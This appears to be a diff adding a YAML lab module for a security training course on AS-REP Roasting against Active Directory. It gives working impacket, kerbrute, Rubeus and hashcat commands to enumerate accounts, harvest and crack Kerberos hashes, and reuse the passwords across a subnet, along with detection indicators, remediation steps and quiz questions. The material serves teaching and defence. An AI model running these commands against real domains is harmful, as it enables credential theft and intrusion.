@@ -1,0 +1,190 @@
+name: "AS-REP Roasting Attack"
+id: "ad-asrep-001"
+category: "Active Directory Security"
+subcategory: "Kerberos Attacks"
+difficulty: "intermediate"
+estimated_time: "45"
+
+tags:
+  - active-directory
+  - kerberos
+  - asrep-roasting
+  - impacket
+  - rubeus
+  - hashcat
+  - credential-access
+  - mitre-t1558.004
+  - pre-authentication
+  - ldap-enumeration
+
+description: |
+  Exploit accounts with Kerberos pre-authentication disabled to request AS-REP
+  responses and crack them offline. Unlike Kerberoasting, this requires no valid
+  domain credentials if usernames can be enumerated.
+
+learning_objectives:
+  - Enumerate accounts with pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH)
+  - Request AS-REP hashes without valid credentials
+  - Crack AS-REP hashes with hashcat
+  - Understand detection and prevention via pre-authentication enforcement
+
+tools:
+  - "Impacket (GetNPUsers)"
+  - "Rubeus"
+  - "Kerbrute"
+  - "Hashcat"
+  - "John the Ripper"
+  - "PowerView"
+
+prerequisites:
+  - "Network access to domain controller (TCP 88)"
+  - "Username list (or valid domain credentials for enumeration)"
+  - "Understanding of Kerberos AS-REQ/AS-REP exchange"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate accounts with pre-authentication disabled (requires domain creds)"
+    commands:
+      - "# From Linux - impacket"
+      - "impacket-GetNPUsers '[domain]/' -usersfile /tmp/users.txt -dc-ip [dc_ip] -no-pass"
+      - "# From Linux with domain credentials"
+      - "impacket-GetNPUsers '[domain]/[username]:[password]' -dc-ip [dc_ip] -request"
+      - "# From Windows with PowerView"
+      - "Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname,userprincipalname"
+      - "# LDAP filter"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'DC=[dc1],DC=[dc2]' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' samAccountName"
+    expected_output: "List of user accounts with DO_NOT_REQUIRE_PREAUTH flag set"
+    detection: "LDAP enumeration queries; Event ID 4768 with Result Code 0x0 (no preauth required)"
+
+  - id: "step2"
+    phase: "reconnaissance"
+    action: "Username enumeration without credentials via Kerbrute"
+    commands:
+      - "# Username enumeration against domain"
+      - "kerbrute userenum --dc [dc_ip] -d [domain] /usr/share/seclists/Usernames/Names/names.txt"
+      - "# Combined with AS-REP roasting attempt"
+      - "kerbrute bruteuser --dc [dc_ip] -d [domain] /usr/share/seclists/Usernames/Names/names.txt"
+    expected_output: "Valid usernames identified; some may have pre-auth disabled"
+    detection: "High volume of AS-REQ packets to DC port 88 from single IP; Event ID 4768"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Request AS-REP hashes without credentials (from Linux)"
+    commands:
+      - "# Single user"
+      - "impacket-GetNPUsers '[domain]/[target_user]' -dc-ip [dc_ip] -no-pass -format hashcat"
+      - "# Multiple users from file"
+      - "impacket-GetNPUsers '[domain]/' -usersfile /tmp/asrep_targets.txt -dc-ip [dc_ip] -no-pass -format hashcat -outputfile /tmp/asrep_hashes.txt"
+      - "# Output john format"
+      - "impacket-GetNPUsers '[domain]/[target_user]' -dc-ip [dc_ip] -no-pass -format john"
+    expected_output: "AS-REP hash in format $krb5asrep$23$user@domain:... saved to file"
+    detection: "Event ID 4768: Kerberos authentication ticket (TGT) requested without pre-auth"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Request AS-REP hashes from Windows using Rubeus"
+    commands:
+      - "# Enumerate and roast all DONT_REQUIRE_PREAUTH accounts"
+      - "Rubeus.exe asreproast"
+      - "# Target specific account"
+      - "Rubeus.exe asreproast /user:[target_user] /format:hashcat /outfile:C:\\temp\\asrep.txt"
+      - "# With existing credentials"
+      - "Rubeus.exe asreproast /domain:[domain] /dc:[dc_ip] /outfile:C:\\temp\\asrep.txt"
+    expected_output: "AS-REP hash in hashcat format written to file"
+    detection: "Rubeus process execution (Event ID 4688); Event ID 4768 for targeted account"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Crack AS-REP hashes offline with hashcat"
+    commands:
+      - "# Identify hash type (18200 = Kerberos 5 AS-REP etype 23)"
+      - "hashcat --identify /tmp/asrep_hashes.txt"
+      - "# Crack with rockyou wordlist"
+      - "hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
+      - "# Crack with rules"
+      - "hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
+      - "# John alternative"
+      - "john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/asrep_hashes.txt"
+    expected_output: "Plaintext password recovered for target account"
+    detection: "Offline attack — no network detection; GPU activity on attacker system"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Use recovered credentials"
+    commands:
+      - "# Validate credentials"
+      - "impacket-smbclient '[domain]/[target_user]:[recovered_password]' -dc-ip [dc_ip]"
+      - "crackmapexec smb [dc_ip] -u [target_user] -p [recovered_password] -d [domain]"
+      - "# Test for admin access"
+      - "crackmapexec smb [target_range] -u [target_user] -p [recovered_password] --continue-on-success"
+      - "evil-winrm -i [target_ip] -u [target_user] -p [recovered_password]"
+    expected_output: "Successful authentication; possibly lateral movement or privilege escalation"
+    detection: "Event ID 4624 successful logon for target account from unexpected source"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1558.004"
+    description: "Steal or Forge Kerberos Tickets: AS-REP Roasting"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-5"
+    description: "Authenticator management — enforce strong authentication"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges"
+  - standard: "CIS Benchmark"
+    control: "Windows Server - Account Policies"
+    description: "Require Kerberos pre-authentication for all accounts"
+
+detection:
+  network_indicators:
+    - "Kerberos AS-REQ packets without PA-ENC-TIMESTAMP (no pre-authentication)"
+    - "High volume of AS-REQ to domain controller port 88"
+    - "AS-REQ for multiple accounts from single source IP in short time"
+  log_indicators:
+    - "Event ID 4768 with Pre-Authentication Type = 0 (no pre-auth)"
+    - "Multiple 4768 events for different accounts from same source IP"
+    - "Kerbrute or similar tool user-agent patterns if REST-based"
+  endpoint_indicators:
+    - "Rubeus.exe or GetNPUsers execution on domain-joined host"
+    - "LDAP queries filtering for userAccountControl flag 4194304"
+
+remediation:
+  immediate:
+    - "Enable Kerberos pre-authentication on ALL user accounts immediately"
+    - "Audit all accounts for UF_DONT_REQUIRE_PREAUTH flag and remediate"
+    - "Reset passwords for all AS-REP roastable accounts with 25+ char random passwords"
+  long_term:
+    - "Enforce Kerberos pre-authentication via GPO: Computer Config > Security Settings"
+    - "Add vulnerable accounts to Protected Users security group"
+    - "Monitor Event ID 4768 with Pre-Authentication Type = 0 and alert"
+    - "Regular account audits for misconfigured UAC flags"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  target_user: "asrep_user"
+  target_ip: "192.168.1.50"
+  target_range: "192.168.1.0/24"
+  recovered_password: ""
+
+assessment_questions:
+  - "What UAC flag must be set for AS-REP Roasting to succeed?"
+  - "How does AS-REP Roasting differ from Kerberoasting in terms of required privileges?"
+  - "What hashcat mode is used for cracking AS-REP hashes?"
+  - "How does adding an account to the Protected Users group mitigate this attack?"
+  - "What detection can be implemented using Windows Event logs?"
+
+references:
+  - url: "https://attack.mitre.org/techniques/T1558/004/"
+    title: "MITRE ATT&CK - AS-REP Roasting"
+  - url: "https://github.com/fortra/impacket"
+    title: "Impacket - GetNPUsers"
+  - url: "https://github.com/GhostPack/Rubeus"
+    title: "Rubeus - Kerberos Attack Toolkit"
+  - url: "https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/"
+    title: "Roasting AS-REPs - harmj0y"
